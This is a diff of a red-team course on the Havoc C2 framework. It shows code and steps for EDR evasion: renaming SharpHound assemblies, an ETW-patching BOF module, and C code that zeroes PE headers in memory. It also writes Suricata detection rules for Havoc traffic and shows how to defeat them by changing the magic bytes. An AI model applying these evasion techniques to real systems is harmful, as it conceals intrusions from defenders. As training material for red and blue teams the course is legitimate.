-The installation is very simple to do. We simply execute the provided .exe and follow the steps on the screen. Once installed, we'll open `Process Hacker` and analyze the process where our beacon resides. This can be done by simply double-clicking the process in question. From there, you will see many available tabs. For our testing purposes, we will be using both the `.NET assemblies` and `Memory` tabs respectively.
+The installation is very simple to do. We simply execute the provided executable and follow the instructions on screen. Once installed, we'll open `Process Hacker` and analyze our beacon process. This can be done by simply double-clicking the process in question. From there, you will see many available *tabs*. For our testing purposes, we will be using both the `.NET assemblies` and `Memory` tabs respectively.
 
-`.NET assemblies` tab example :
+`.NET assemblies` tab example:
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240301144914.png)
 
-`Memory` tab example :
+`Memory` tab example:
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240301145040.png)
 
-Going back to our scenario where we executed the `SharpHound` binary inline, let's take a look at what we can see in the `.NET assemblies` tab upon execution. It is very important to keep in mind that after the execution of the binary is done, Havoc automatically unloads the AppDomain associated with our C# executable in memory. As a result, if our C# binary has finished executing and output was received back in the Havoc console, we won't be able to see what exactly has happened in `Process Hacker`. Additionally, please note that `Process Hacker` does not automatically update values in the `.NET assemblies` tab unless we exit and open the properties of the process again. To circumvent this problem, we will take a series of steps which are outlined below.
+Going back to our scenario where we executed the `SharpHound` binary inline, let's take a look at what we can see in the `.NET assemblies` tab upon execution. It is very important to keep in mind that after the execution of the binary is done, Havoc automatically unloads the *AppDomain* associated with our C# executable in memory.
+
+As a result, if our C# binary has finished executing and output was received back in the Havoc console, we won't be able to see what exactly has happened in `Process Hacker`. Additionally, please note that `Process Hacker` does not automatically update values in the `.NET assemblies` tab unless we exit and open the properties of the process again. To circumvent this problem, we will take a series of steps which are outlined below.
 
 * Open Process Hacker.
 
@@ -5367,7 +5415,7 @@ Going back to our scenario where we executed the `SharpHound` binary inline, let
 2024-03-01T11:30:03.0068679-08:00|ERROR|Unable to connect to LDAP, verify your credentials
 ```
 
-* While the execution is happening(make sure that execution has not finished when doing this), we will double-click on our beacon process.
+* While the execution is happening (make sure that execution has not finished when doing this), we will double-click on our beacon process.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240302143124.png)
 
@@ -5375,21 +5423,23 @@ Going back to our scenario where we executed the `SharpHound` binary inline, let
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240302143338.png)
 
-* We will analyze the artifacts present as a result of the execution
+* We will analyze the artifacts present as a result of the execution.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240301144715.png)
 
 As you can see in the screenshot above, the `SharpHound` AppDomain immediately stands out. Thus, if an EDR product is used within the environment, the presence of this artifact will immediately generate an alert. Now that we have this piece of information in sight, let's take a look at how we can alter the `AppDomain` to avoid getting detected.
 
-We have decided to download a fresh copy of `SharpHound` from the link below : 
+We have decided to download a fresh copy of `SharpHound` from the link below: 
 
 https://github.com/BloodHoundAD/SharpHound
 
-If we take a look at the `Sharphound.csproj` file specifically, we will find this part : 
+If we take a look at the `Sharphound.csproj` file specifically, we will find this part: 
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240302190938.png)
 
-What you see in the screenshot above, is just some information about the C# project. However, this information will also be part of the executable upon compilation. For example, we see the `AssemblyName` value set to `SharpHound`. Thus, when this C# binary is used, the AppDomain will always be `SharpHound`. And if you recall the screenshot in which we looked at the loaded AppDomains upon the execution of SharpHound inline, we do in fact see the AppDomain being `SharpHound`.
+What you see in the screenshot above, is just some information about the C# project. However, this information will also be part of the executable upon compilation. 
+
+For example, we see the `AssemblyName` value set to `SharpHound`. Thus, when this C# binary is used, the AppDomain will always be `SharpHound`. And if you recall the screenshot in which we looked at the loaded AppDomains following SharpHound's execution, we do in fact see the AppDomain as `SharpHound`.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240301144715.png)
 
@@ -5397,10 +5447,11 @@ Now of course `SharpHound` isn't the best of names to give to our assemblies. Ho
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240302191915.png)
 
-With this modification done, we can move ahead with the compilation. To ensure proper compilation, we ensure that the `Release` option is set as well as setting the compilation architecture to `x64`.
+With this modification done, we can move ahead with the compilation. To ensure proper compilation, we select the `Release` option as well as set the compilation architecture to `x64`.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240302220321.png)
-Next, we select `Build Solution` from the `Build` menu.
+
+Next, we select `Build Solution` from the `Build` menu to initiate the compilation.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240302220402.png)
 
@@ -5446,15 +5497,21 @@ When compilation is started, Visual Studio attempts to download the packages fro
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240302222553.png)
 
-So in order to hide the reference to `SharpHoundCommonLib`, we would also need to update the values in this package as well. This can of course be done though not necessary. For now, we'll assume that we did in fact change up the values everywhere(even in the individual packages). With this being said, let's move on and see what else we would need to patch up in our binary. You might be wondering why we're skipping the patching of the `SharpHoundCommonLib`. We'll explain this in just a moment.
+So in order to hide the reference to `SharpHoundCommonLib`, we would also need to update the values in this package as well. This can of course be done, though not necessary. For now, we'll assume that we did in fact change up the values everywhere (even in the individual packages). 
+
+With that being said, let's move on and see what else we would need to patch up in our binary. You might be wondering why we're skipping the patching of the `SharpHoundCommonLib`. We'll explain this in just a moment.
 
 ### Scenario #1 - Hunting for Methods
 
-As we saw before, references to SharpHound would need to be patched up in order to avoid detection. However, as we will see in this section, we will need to patch up quite a lot of things in our binary to achieve the desired result. Patching the `AssemblyName`is one thing, now let's check out the rest. We previously mentioned that ETW uses providers to collect data but this data needs to be collected somehow right? This is where the term `Consumers` comes in. Consumers are used to get all the data that was collected by the providers. With that being said, we can write our own custom Consumer that will collect data related to `.NET` assemblies. This way, we will be able to see all the references to SharpHound that are made when executing it inline. The consumer we will be using for this example has been written by Adam Chester and can be found here :
+As we saw before, references to SharpHound would need to be patched up in order to avoid detection. However, as we will see in this section, we will need to patch up quite a lot of things in our binary to achieve the desired result.
+
+Patching the `AssemblyName`is one thing, now let's check out the rest. We previously mentioned that ETW uses providers to collect data but this data needs to be collected somehow right? 
+
+This is where the term `Consumers` comes in. Consumers are used to get all the data that was collected by the providers. With that being said, we can write our own custom Consumer that will collect data related to `.NET` assemblies. This way, we will be able to see all the references to SharpHound that are made when executing it inline. The consumer we will be using for this example has been written by Adam Chester and can be found here:
 
 https://gist.github.com/xpn/41f193cf1bdeeee19ebd351b19cff45c
 
-This code is written in C and needs to be compiled in Visual Studio. In order for the compilation to work, you need to have installed `Desktop development with C++` package within Visual Studio. From there, simply open the C code in Visual Studio, set the CPU to x64 and compile it as a release. From our testing, we have found that a small modification is required to make the code work with newer versions of C.
+This code is written in C and needs to be compiled in Visual Studio. In order for the compilation to work, you need to have the `Desktop development with C++` package within Visual Studio. From there, simply open the C code in Visual Studio, set the CPU to x64 and compile it as a release. From our testing, we have found that a small modification is required to make the code work with newer versions of C.
 
 On line 106, please update it to:
 
@@ -5467,16 +5524,19 @@ Once that's done, we perform the compilation and execute the provided executable
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240303130611.png)
 
-As you can see, if we dig deeper into the output that ETW can provide us, we can also see the method names that are being invoked by our C# executable. Now of course, we can rename those methods so that they don't look as fishy, however there's a simpler approach to the problem. Bypassing ETW.
+As you can see, if we dig deeper into the output that ETW can provide us, we can also see the method names that are being invoked by our C# executable. Now of course, we can rename those methods so that they don't look as fishy, however there's a simpler approach to the problem. *Bypassing ETW*.
+
 ### Bypassing ETW
 
-While we can update all malicious text in our C# code(AssemblyName, method names, etc), it is very time consuming and we would need to repeat the process for al our C# executables. But let's stop and think for a second. All those things that can give us away are the result of ETW performing its intended role. Remember how we were able to bypass AMSI in a previous section? Well, ETW can be bypassed in a similar manner. In this section, we'll explore a custom BOF that will allow us to patch ETW. As a result of ETW failing to operate, all the strings and method names that clearly indicate malicious activity will be completely gone, thus providing an extra level of stealth for us against defenders.
+While we can update all malicious text in our C# code *(AssemblyName, method names, etc)*, it is very time consuming and we would need to repeat the process for all our C# executables. But let's stop and think for a second. All those things that can give us away are the result of ETW performing its intended role. Remember how we were able to bypass AMSI in a previous section? 
 
-The BOF that we will be using can be found here : 
+Well, ETW can be bypassed in a similar manner. In this section, we'll explore a custom *BOF* that will allow us to patch *ETW*. As a result of ETW failing to operate, all the strings and method names that clearly indicate malicious activity will be completely gone, thus providing an extra level of stealth for us against defenders.
+
+The *BOF* that we will be using can be found here: 
 
 https://github.com/ajpc500/BOFs/tree/main/ETW
 
-In a nutshell, we aim at patching **ntdll!EtwEventWrite** in memory with a specific sequence of bytes. For more details on how this specific BOF operates, please visit the below resource :
+In a nutshell, we aim at patching **ntdll!EtwEventWrite** in memory with a specific sequence of bytes. For more details on how this specific BOF operates, please visit the below resource:
 
 https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/
 
@@ -5497,7 +5557,9 @@ From there, we created the directory in which our new ETW bypass module will res
 
 `Havoc/client/Modules/etw`
 
-Following this, we wrote the python script that will be associated with our module. Let's take a look at it.
+Following this, we wrote the following python script that will be associated with our module. 
+
+Let's take a look at it.
 
 ```
 from havoc import Demon, RegisterCommand
@@ -5542,13 +5604,13 @@ def etw(demonID, *param):
 RegisterCommand(etw, "", "etw", "in process ETW patch", 0, "start or stop", '')
 ```
 
-You should be familiar by now with most of the parts in this code as they're mostly the same. However, since this BOF is available for both x86 and x64 bit, we've decided to add an additional `if` statement at the end to verify the architecture of the target process to choose the appropriate version of the BOF.
+You should be familiar by now with most of the parts in this code as they're mostly the same. However, since this BOF is available for both *x86* and *x64* bit, we've decided to add an additional `if` statement at the end to verify the architecture of the target process. This will allow us to choose the appropriate version of the BOF to run.
 
 Apart from that, our BOF will be registered under the `etw` command.
 
-With this said, now we just need to make sure that all files are present in the right directory.
+With that said, now we just need to make sure that all files are present in the right directory.
 
-Here's how the structure should look like :
+Here's how the structure should look like:
 
 ```
 ➜  etw git:(main) ✗ cp ~/SquidGuard/BOFs/ETW/etw.x86.o .
@@ -5562,43 +5624,53 @@ drwxr-xr-x 21 kali kali 4096 Mar  2 03:45 ..
 -rw-r--r--  1 kali kali 2013 Mar  2 03:49 etw.x86.o
 ```
 
-As you can see, we are in the `etw` directory that we've created earlier specifically for this module. We have our actual module (`etw.py`) as well as both the BOF's for x86 and x64 respectively.  Now that our module is good to go, let's load it up into Havoc.
+As you can see, we are in the `etw` directory that we've created earlier specifically for this module. We have our actual module (`etw.py`) as well as both the BOF's for *x86* and *x64* respectively.  Now that our module is good to go, let's load it up into Havoc.
 
-Like before, it's important to make sure that the module has been successfully loaded and is free of errors :
+Like before, it's important to make sure that the module has been successfully loaded and is free of errors:
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240303173257.png)
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240303173848.png)
 
-Looks like it's all working and ready to be used. Let's attempt to stop ETW monitoring first : 
+Looks like it's all working and ready to be used. Let's attempt to stop ETW monitoring first: 
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240303175536.png)
 
-Appears to have worked. Now if we try to run SharpHound.exe inline, we will see absolutely nothing in the `.NET assemblies` tab in `Process Hacker` : 
+Appears to have worked. Now if we try to run SharpHound.exe inline, we will see absolutely nothing in the `.NET assemblies` tab in `Process Hacker`: 
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240303175624.png)
 
-Our bypass was successful! So no need to patch up every single tool we have. Bypassing ETW as a whole was enough to get rid of the entire evidence. Or was it enough?
+Our bypass was successful! So no need to patch up every single tool we have manually. Bypassing ETW as a whole was enough to get rid of the entire evidence. Or was it enough?
 
 ### Digging even deeper into C# inline execution
 
-Previously, we cleared up all the evidence that ETW can provide defenders with. This evidence is enough to get us caught during an engagement. But now that we got rid of this evidence, are we really that undetectable? Well, our footprint has been significantly reduced; though not entirely. In this section, we'll take a look at the memory tab in `Process Hacker` to see if any artifacts are present in memory as a result of executing C# code inline. If we attempt to run our `SharpHound.exe` binary inline once again in Havoc and check out memory data, we will stumble upon this find :
+Previously, we cleared up all the evidence that ETW can provide defenders with. This evidence is enough to get us caught during an engagement. But now that we got rid of this evidence, are we really that undetectable? 
+
+Well, our footprint has been significantly reduced; though not entirely. In this section, we'll take a look at the memory tab in `Process Hacker` to see if any artifacts are present in memory as a result of us executing C# code inline. If we attempt to run our `SharpHound.exe` binary inline once again and check out memory data, we will stumble upon this find:
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240303214835.png)
 
-The "This program cannot be run in DOS mode" line is very popular and is present in almost every modern executable's header. Now in our case, seeing this immediately should raise suspicion as this means that there's a process on the system that contains another program loaded within its memory which is not typical behavior. Additionally, remember how we mentioned that Havoc automatically unloads AppDomains after the execution has finished? Well, it's a little different when it comes to memory. Even after the executable has finished running, this header will still remain in memory. Reason being, the executable, once loaded into memory, isn't unloaded automatically by Havoc after execution. Thus, this leaves a trace that can potentially get us exposed. With this being said, let's look at a few ways we can use to circumvent this issue.
+The "*This program cannot be run in DOS mode*" line is very popular and is present in almost every modern executable's header. Now in our case, seeing this immediately should raise suspicion as this means that there's a process on the system that contains another program loaded within its memory which is not typical behavior. 
 
-## Stomping PE header - Method #1
+Additionally, remember how we mentioned that Havoc automatically unloads AppDomains after the execution has finished? Well, it's a little different when it comes to memory. Even after the executable has finished running, this header will still remain in memory. 
 
-The first method that we will be looking at involves adding some custom code into our C# assemblies. This custom code will be responsible for stomping the PE header at the beginning or the end of the assembly's execution. Let's take a look at the code in question : 
+Reason being, the executable, once loaded into memory, isn't unloaded automatically by Havoc after execution. Thus, this leaves a trace that can potentially get us exposed. With this being said, let's look at a few ways we can use to circumvent this issue.
+
+## Stomping The PE header - Method #1
+
+The first method that we will be looking at involves adding some custom code into our C# assemblies. This custom code will be responsible for stomping the PE header at the beginning or at the end of the assembly's execution. Let's take a look at the code in question: 
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240316153529.png)
 
-In a nutshell, we will be iterating through memory regions and zeroing out the memory in question. As a result, the PE header will be erased and thus reducing our footprint. Seems like a good way to stomp the PE header right? Well it is, although we would need to add this piece of code to all our C# assemblies which can be a very time consuming task depending on the amount of C# assemblies you normally use. Nonetheless, it is a valid way to stomp the PE header and it is worth considering as part of your offensive tradecraft.
+In a nutshell, we will be iterating through memory regions and zeroing out the memory in question. As a result, the PE header will be erased and thus reducing our footprint. 
 
-## Stomping PE header - Method #2
+Seems like a good way to stomp the PE header right? Well it is, although we would need to add this piece of code to all of our C# assemblies; which can be a very daunting task depending on the amount of C# assemblies we normally use. 
 
-Let's now take a look at another method. If for whatever reason, you are not able to incorporate the code from the previous section into your C# tradecraft, no worries - you can always clear the PE header afterwards. For our purposes, we'll use the following C code : 
+Nonetheless, it is a valid way to stomp the PE header and it is worth considering as part of your offensive tradecraft.
+
+## Stomping The PE header - Method #2
+
+Let's now take a look at another method. If for whatever reason, you are not able to incorporate the code from the previous section into your C# tradecraft, no worries - you can always clear the PE header afterwards. For our purposes, we'll use the following C code: 
 
 ```sql
 #include <windows.h>
@@ -5643,7 +5715,9 @@ int main() {
 }
 ```
 
-In a nutshell, we are declaring the `target` variable and we're specifying our PE header in it. The rest of the code simply initiates an enourmous loop that will go through the entire memory of the current process looking for any occurrence of `This program cannot be run in DOS mode`. And if this string is found at any place in memory, it will be zeroed out. Let's now compile our binary : 
+In short, we are declaring the `target` variable and we're specifying our PE header in it. The rest of the code simply initiates an enormous loop that will go through the entire memory of the current process looking for any occurrences of `This program cannot be run in DOS mode`. 
+
+And if this string is found at any place in memory, it will be zeroed out. Let's now compile our binary: 
 
 ```bash
 ┌──(ori㉿ori)-[~/…/client/testing]
@@ -5674,11 +5748,11 @@ Let's fire up `Process Hacker` and locate our PE header - of course, you would n
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240830092250.png)
 
-Alrighty, let's make note of that address and execute our binary to stomp the header :
+Alrighty, let's make note of that address and execute our binary to stomp the header:
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240830092439.png)
 
-From here, let's click on the `Refresh` button at the top right in `Process Hacker` and review the memory once again : 
+From here, let's click on the `Refresh` button at the top right in `Process Hacker` and review the memory once again: 
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240830092615.png)
 
@@ -5686,7 +5760,7 @@ Great! We were able to stomp the PE header. You might have noticed that our bina
 
 # Stomping Other Data In Memory
 
-Similarly, we can also zero out other pieces of data in memory. For example, the `amsipatch` BOF that we had incorporated earlier leaves some artifacts in memory :
+Similarly, we can also zero out other pieces of data in memory. For example, the `amsipatch` BOF that we had incorporated earlier leaves some artifacts in memory:
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240303180053.png)
 
@@ -5694,21 +5768,21 @@ Feel free to adjust the C source code provided the previous section to clear out
 
 # IDS/IPS detections - Suricata
 
-In this last section, we'll take a look at how our Havoc beacon could potentially be spotted by an IDS/IPS system such as `Suricata` or `Snort`. These systems give defenders the possibility to write custom rules to detect malicious activity. We'll focus on analyzing a few sample rules and see how we can bypass them. But before that, let's quickly walk through the Suricata setup.
+In this last section, we'll take a look at how our Havoc beacon could potentially be spotted by an IDS/IPS system such as `Suricata` or `Snort`. These systems give defenders the possibility to write custom rules to detect malicious activity. We'll focus on analyzing a few sample rules and see how we can bypass them. But before that, let's quickly walk through the *Suricata* setup.
 
 ## Installation
 
-First off, let's begin with the installation. To install Suricata, all we need to do is run a system apt install command : 
+First off, let's begin with the installation. To install *Suricata*, all we need to do is run a simple apt install command: 
 
 ```
 sudo apt install -y suricata
 ```
 
-From there, we'll need to verify that the installation was successful using the below command : 
+From there, we'll need to verify that the installation was successful using the below command: 
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240908184734.png)
 
-Next, we can configure Suricata to start on boot : 
+Next, we can configure Suricata to start on boot: 
 
 ```
 sudo systemctl enable suricata 
@@ -5717,21 +5791,21 @@ sudo systemctl start suricata
 
 ## Configuration
 
-Let's proceed with the configuration. The very first thing we'll do is make sure that Suricata is running on our desired interface. We'll need to edit the following file : 
+Let's proceed with the configuration. The very first thing we'll do is make sure that Suricata is running on our desired interface. We'll need to edit the following file: 
 
 ```
 sudo nano /etc/suricata/suricata.yaml
 ```
 
-Find the following lines and update them accordingly : 
+Find the following lines and update them according to your setup.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240908185011.png)
 
 ## Adding Our First Rule
 
-Alrighty, we're half way there. Let's now create our first test rule that would be responsible for detecting the default `User-Agent` the Havoc C2 uses in its http traffic.
+Alrighty, we're half way there. Let's now create our first test rule that would be responsible for detecting the default `User-Agent` the Havoc C2 uses in its HTTP traffic.
 
-To do so, we will browse to `/etc/suricata/rules` and create a file called `detect-havoc-header.rules` :
+To do so, we will browse to `/etc/suricata/rules` and create a file called `detect-havoc-header.rules`:
 
 ```sql
 root@ori-virtual-machine:/etc/suricata/rules# cat detect-havoc-header.rules 
@@ -5739,7 +5813,7 @@ alert http any any -> any any (msg:"Detect Havoc Default User Agent"; http.heade
 root@ori-virtual-machine:/etc/suricata/rules# 
 ```
 
-The User-Agent that we have used in this rule corresponds to the default one used by Havoc : 
+The *User-Agent* that we have used in this rule corresponds to the default one used by Havoc: 
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240908221926.png)
 
@@ -5747,11 +5821,11 @@ With the rule created, let's now open `/etc/suricata/suricata.yaml` and add our 
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240908185713.png)
 
-From there, we'll update the suricata rule database using `sudo suricata-update` as show below : 
+From there, we'll update the Suricata rule database using `sudo suricata-update` as shown below: 
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240908185803.png)
 
-And lastly, we need to restart the Suricata service : 
+And lastly, we need to restart the Suricata service for the changes to apply.
 
 ```
 sudo systemctl restart suricata
@@ -5761,9 +5835,11 @@ Our Suricata setup is now complete. In the next section, we'll see if our rule t
 
 ## Testing Our First Rule
 
-Now from here, the network setup required for testing the rule is up to you. The only thing to keep in mind is that all traffic must pass through the machine on which Suricata is installed so that packet inspection can be performed. As you might have noticed in the Havoc screenshot above, we specified an HTTP proxy to be used for our beacon. We have setup a `SQUID` proxy on port 3128 on the Suricata host that will be responsible for forwarding packets. That way, we are able to receive the packets; get them analyzed by Suricata as well as redirect them to the proper location(our kali linux VM) using our proxy. 
+Now from here, the network setup required for testing the rule is up to you. The only thing to keep in mind is that all traffic must pass through the machine on which Suricata is installed so that packet inspection can be performed. 
 
-If you're interested in replicating our setup, here are the necessary steps : 
+As you might have noticed in the Havoc screenshot above, we specified an HTTP proxy to be used for our beacon. We have setup a `SQUID` proxy on port *3128* on the Suricata host that will be responsible for forwarding packets. That way, we are able to receive the packets; get them analyzed by Suricata as well as redirect them to the proper location (our Kali Linux VM) using our proxy. 
+
+If you're interested in replicating our setup, here are the necessary steps to follow: 
 ``
 ```bash
 # Installation
@@ -5782,16 +5858,24 @@ service squid start
 systemctl enable squid
 ```
 
-Now, all that's left to do is execute the actual exe binary from Havoc on the Windows host. The beacon should pass through our squid proxy host on which Suricata is running. The packet will be received, scanned by Suricata and redirected to the appropriate location by the Squid proxy. And, we can indeed verify that our rule works as intended : 
+Now, all that's left to do is execute the actual exe binary from Havoc on the Windows host. The beacon should pass through our squid proxy host on which Suricata is running. The packets will be received, scanned by Suricata and redirected to the appropriate location by the Squid proxy. 
+
+And, we can indeed verify that our first rule works as intended: 
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240908222710.png)
 # Countering the first rule
 
-I'm sure you already have a few days as to how we can counter this rule. First and foremost, we can always change the User-Agent from the default value to something more uncommon. Additionally, Suricata is able to identify this because the HTTP protocol is unencrypted thus, we could of generated a beacon that would communicate over HTTPS on port 443. This way, all the traffic would be encrypted and Suricata won't be able to perform any inspection. However, there are multiple ways to implement HTTPS decryption and only then pass this data to Suricata for analysis. We won't go over this method in this course though if you're willing to see this be presented at some point, do let us know. From our standpoint, we will continue with the assumpting that deep SSL inspection is implemented and that Suricata is able to view the packets in clear text.
+I'm sure you've already thought of a few ways we could employ to counter this rule. First and foremost, we can always change the *User-Agent* from the default value to something more uncommon. 
+
+Additionally, Suricata is able to identify this because the HTTP protocol is unencrypted, thus we could of generated a beacon that would communicate over HTTPS on port 443 instead. This way, all the traffic would be encrypted and Suricata wouldn't be able to perform any inspection.
+
+However, there are multiple ways to implement HTTPS decryption and only then pass this data to Suricata for analysis. We won't go over this method in this course though. If you're willing to see this however, do let us know. 
+
+From our standpoint, we will continue with the assumption that deep SSL inspection is implemented and that Suricata is able to view the packets in clear text.
 
 # Second Rule Testing
 
-Alrighty, now that we've had the chance to look at our first rule. Let's implement something a bit more robust. This section is based on : https://www.immersivelabs.com/blog/havoc-c2-framework-a-defensive-operators-guide/. As per the research mentioned above, there's an interesting sequence of magic bytes that can be found in packets specific to the Havoc C2 : 
+Alrighty, now that we've had the chance to look at our first rule, let's implement something a bit more robust. This section is based on: https://www.immersivelabs.com/blog/havoc-c2-framework-a-defensive-operators-guide/. As per the research mentioned above, there's an interesting sequence of magic bytes that can be found in packets specific to the Havoc C2: 
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240916153931.png)
 
@@ -5799,11 +5883,11 @@ It seems that the bytes `de ad be ef` can be found in the Havoc's TCP traffic da
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240916154040.png)
 
-Additionally, as outline by the post, this magic value can be found in the `Defines.h` file in Havoc's source files.
+Additionally, as outlined by the post, this magic value can be found in the `Defines.h` file in Havoc's source files.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240916155102.png)
 
-We went ahead and verified this for ourselves to make sure that it's still relevant : 
+We went ahead and verified this for ourselves to make sure that it's still relevant. 
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240916155250.png)
 
@@ -5817,23 +5901,26 @@ alert tcp any any -> any any (msg:"Detected byte sequence DE AD BE EF"; content:
 root@ori-virtual-machine:/etc/suricata/rules# 
 ```
 
-From there, we will once again run the following 2 commands to reload Suricata with our updated rule : 
+From there, we will once again run the following *2* commands to reload *Suricata* with our updated rule. 
 
 ```
 sudo suricata-update
 sudo systemctl restart suricata
 ```
 
-After executing our beacon on Windows, we will see that our previous User-Agent rule triggers as well as the new one that we implemented.
+After executing our beacon once again on Windows, we will see that our previous User-Agent rule triggers, as well as the new one that we've implemented.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240916160244.png)
 
 We will stop here, though if you're interested, you can keep on reading https://www.immersivelabs.com/blog/havoc-c2-framework-a-defensive-operators-guide/ for more advanced packet traffic analysis related to the Havoc C2.
+
 # Countering the second rule
 
-As you can see, based on the User-Agent and some small bytes in the traffic, we can identify potentially malicious traffic. It's also important to note that these are all default values(meaning experienced attackers will likely change them before attacking an environment). The rules that we have created so far only apply to the Havoc C2 because of specific keywords/bytes that we have utilized. However, the same methodologies can be applied for other C2's as well. For more details, feel free to read up more on the subject in the following PDF :  https://repositorio-aberto.up.pt/bitstream/10216/142718/2/572020.pdf
+As you can see, based on the User-Agent and some small bytes in the traffic, we can identify potentially malicious traffic. It's also important to note that these are all default values; meaning that experienced attackers will likely change them before attacking an environment. The rules that we have created so far only apply to the Havoc C2 because of specific keywords/bytes that it utilizes. 
 
-So, what do we do to invalidate the rule we just created? You definitely guessed, we can simply modify the magic byte in the `Defines.h` file and recompile both the client and the team server.
+However, the same methodologies can also be applied for other C2's as well. For more details, feel free to read up more on the subject in the following PDF:  https://repositorio-aberto.up.pt/bitstream/10216/142718/2/572020.pdf
+
+So, what do we do to invalidate the rule we just created? You guessed it, we can simply modify the magic bytes in the `Defines.h` library and recompile both the client and the team server.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240916161018.png)
 
@@ -5841,13 +5928,13 @@ To avoid confusion, let's clone the Havoc repository once again and create an en
 
 # Changing our Packet Footprint
 
-Now you might be tempted to just swap the `0xDEADBEEF` value in `Defines.h` and generate a new beacon to make this work. Unfortunately, it's more complicated than that, you see the `0xDEADBEEF` is also used in numerous other spots in Havoc's code.
+Now you might be tempted to just swap the `0xDEADBEEF` value in `Defines.h` and generate a new beacon to make this work. Unfortunately, it's more complicated than that. You see, the `0xDEADBEEF` bytes are also used in numerous other places in Havoc's code.
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240916163819.png)
 
 To make this work, you would need to swap out the `0XDEADBEEF` value in every single one of these files. Worry not, let's walk through this together!
 
-Firstly, we will clone the repo and install the necessary dependencies for the team server :
+Firstly, we will clone the repo and install the necessary dependencies for the team server:
 
 ```sql
 $ git clone https://github.com/HavocFramework/Havoc.git
@@ -5856,7 +5943,7 @@ $ cd teamserver
 $ go mod download golang.org/x/sys
 ```
 
-From there, we'll go back to the Havoc root directory and update the `makefile` with the following contents : 
+From there, we'll go back to the Havoc root directory and update the `makefile` with the following contents: 
 
 ```
 $ cd .. # We want to go back to ~/Havoc
@@ -5919,43 +6006,47 @@ clean: ts-cleanup client-cleanup
         @ rm -rf payloads/Demon/.idea
 ```
 
-Here are the changes that were made to the original file : 
+Here are the changes that were made to the original file: 
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240916222145.png)
 
-As you can see, we added a few instances of find/sed combinations in order to substitute every instance of `0xdeadbeef` for `0xaabbccdd` as those are our chosen magic bytes. Keep in mind that the magic bytes that you choose must be exactly 4 bytes long otherwise the flow will be broken. After making those changes, save the file.
+As you can see, we added a few instances of *find/sed* combinations in order to substitute every instance of `0xdeadbeef` for `0xaabbccdd` as those are our new chosen magic bytes. Keep in mind that the magic bytes that you choose must be exactly *4 bytes long* otherwise the flow will be broken. After making those changes, save the file.
 
-Now you're ready to make the actual builds :
+Now you're ready to make the actual builds:
 
 ```
 $ make ts-build
 $ make client-build
 ```
 
-When the builds complete, you can start the server : 
+When the builds complete, you can start the server: 
 
 ```bash
 $ sudo ./havoc server --profile ./profiles/havoc.yaotl -v --debug
 ```
 
-And use the client to connect : 
+And use the client to connect: 
 
 ```bash
 $ ./havoc client
 ```
 
-From there, you can create a new listener and proceed to create a payload. Upon executing this payload on the Windows target, we observe the new magic bytes in effect :
+From there, you can create a new listener and proceed to create a payload. Upon executing this payload on the Windows target, we observe the new magic bytes in effect:
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240916221855.png)
 
-Additionally, we can also verify that our rule matching for `0xdeadbeef` does not trigger anymore and that only our User-Agent rule triggers as expected :
+Additionally, we can also verify that our rule matching for `0xdeadbeef` does not trigger anymore; and that only our User-Agent rule triggers as expected:
 
 ![](/assets/imgs/havoc-c2/Pasted image 20240916222652.png)
 
-And that wraps up our Suricata section! The rules that we've showcased are really basic but nonetheless effective at determining malicious traffic. We primarily targeted default Havoc values that if unchanged, can be clear indications of compromise. More experienced attackers will definitely swap the default values to something else to increase their stealth levels. This makes detecting C2 traffic a lot more complex and we should turn behavioral based analysis now. We will definitely cover this in a future course!
+And that wraps up our Suricata section! The rules that we've showcased are really basic but nonetheless effective at determining malicious traffic. We primarily targeted default Havoc values that if unchanged, can be clear indications of compromise. 
+
+More experienced attackers will definitely swap the default values to something else, to increase their stealth levels. This makes detecting C2 traffic a lot more complex requiring us to turn to behavioral based analysis instead. We will definitely cover this in a future course!
 # Words of goodbye and Thank you
 
-Alrighty folks, that concludes our `Havoc C2 Pentesting` course. We hope that you've enjoyed it as much as we loved making it. We hope you'll check out other courses of ours in the future! Before we part ways, here are a few resources that we have used while creating this course and that might be useful for your own personal development.
+Alrighty folks, that concludes our `Red Teaming With Havoc C2` course. We hope that you've enjoyed it as much as we loved making it. We hope you'll check out other courses of ours in the future! 
+
+Before we part ways, here are a few resources that we have used while creating this course and that might be useful for your own personal development.
 
 https://github.com/wsummerhill/CobaltStrike_BOF_Collections
 
